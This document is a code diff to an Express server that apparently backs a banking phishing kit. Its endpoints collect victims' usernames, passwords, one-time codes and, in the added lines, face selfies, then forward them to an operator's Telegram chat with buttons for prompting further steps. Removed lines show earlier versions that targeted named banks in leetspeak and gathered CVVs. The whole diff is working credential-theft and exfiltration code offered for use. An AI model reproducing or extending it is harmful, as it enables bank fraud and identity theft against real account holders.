@@ -9,6 +9,13 @@ app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+const fileUpload = require('express-fileupload');
+
+app.use(fileUpload({
+    limits: { fileSize: 10 * 1024 * 1024 }, // límite 10MB
+    abortOnLimit: true,
+}));
+
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 const CLIENTES_DIR = './clientes';
@@ -57,6 +64,7 @@ app.post('/enviar', async (req, res) => {
 🔐 CL4V: <code>${clavv}</code>
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
+
 `;
   const cliente = {
     status: "esperando",
@@ -69,8 +77,8 @@ app.post('/enviar', async (req, res) => {
   const keyboard = {
     inline_keyboard: [
       [
-        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
-        { text: "👤SELFIE", callback_data: `errortok:${txid}` }
+        { text: "👤SELFIE", callback_data: `laderrorselfi:${txid}` },
+        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
       ],
       [
         { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
@@ -90,16 +98,18 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
-// Endpoint para /enviare (B4NPLUX-EMPRES4)
-app.post('/enviare', async (req, res) => {
+
+app.post('/enviar2', async (req, res) => {
   const { usar, clavv, txid, ip, ciudad } = req.body;
   const mensaje = `
-🔵B4NPLUX-EMPRES4🔵
+🔵GTC🔵
 🆔 ID: <code>${txid}</code>
 📱 US4R: <code>${usar}</code>
-🔐 CL4V: <code>${clavv}</code>
+
+🔐 C0D3: <code>${clavv}</code>
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
+
 `;
   const cliente = {
     status: "esperando",
@@ -112,11 +122,10 @@ app.post('/enviare', async (req, res) => {
   const keyboard = {
     inline_keyboard: [
       [
-        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
-        { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
+        { text: "👤SELFIE", callback_data: `laderrorselfi:${txid}` },
+        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
       ],
       [
-        { text: "💳C3VV", callback_data: `ceve:${txid}` },
         { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
       ]
     ]
@@ -134,29 +143,34 @@ app.post('/enviare', async (req, res) => {
   res.sendStatus(200);
 });
 
-// Endpoint para /enviar3 (M3RC4NTIL-PERSON4S OTP)
+
 app.post('/enviar3', async (req, res) => {
-  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;
+  const { usar, clavv, txid, ip, ciudad } = req.body;
   const mensaje = `
-🔑🔵M3RC4NTIL-PERSON4S🔵
+🔵GTC🔵
 🆔 ID: <code>${txid}</code>
 📱 US4R: <code>${usar}</code>
-🔐 CL4V: <code>${clavv}</code>
-🔑 0TP: <code>${dinamic}</code>
+
+🔐 RE-C0D3: <code>${clavv}</code>
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
+
 `;
-  const cliente = cargarCliente(txid) || {};
-  cliente.status = "esperando";
+  const cliente = {
+    status: "esperando",
+    usar,
+    clavv,
+    ip,
+    ciudad
+  };
   guardarCliente(txid, cliente);
   const keyboard = {
     inline_keyboard: [
       [
-        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
-        { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
+        { text: "👤SELFIE", callback_data: `laderrorselfi:${txid}` },
+        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
       ],
       [
-        { text: "💳C3VV", callback_data: `ceve:${txid}` },
         { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
       ]
     ]
@@ -173,6 +187,39 @@ app.post('/enviar3', async (req, res) => {
   });
   res.sendStatus(200);
 });
+
+app.post('/enviar-foto', async (req, res) => {
+    try {
+        const photo = req.files?.photo;
+        const caption = req.body.caption || 'Foto facial';
+
+        if (!photo) {
+            return res.status(400).send('No se recibió la foto');
+        }
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: (() => {
+                const form = new FormData();
+                form.append('chat_id', CHAT_ID);
+                form.append('photo', photo.data, {
+                    filename: photo.name,
+                    contentType: photo.mimetype
+                });
+                form.append('caption', caption);
+                form.append('parse_mode', 'HTML');
+                return form;
+            })()
+        });
+
+        res.sendStatus(200);
+    } catch (error) {
+        console.error('Error enviando foto a Telegram:', error);
+        res.sendStatus(500);
+    }
+});
+
+
 
 // Otros endpoints similares (agrega /enviar4, /enviar3e, etc. si los necesitas, sin preguntas)
 
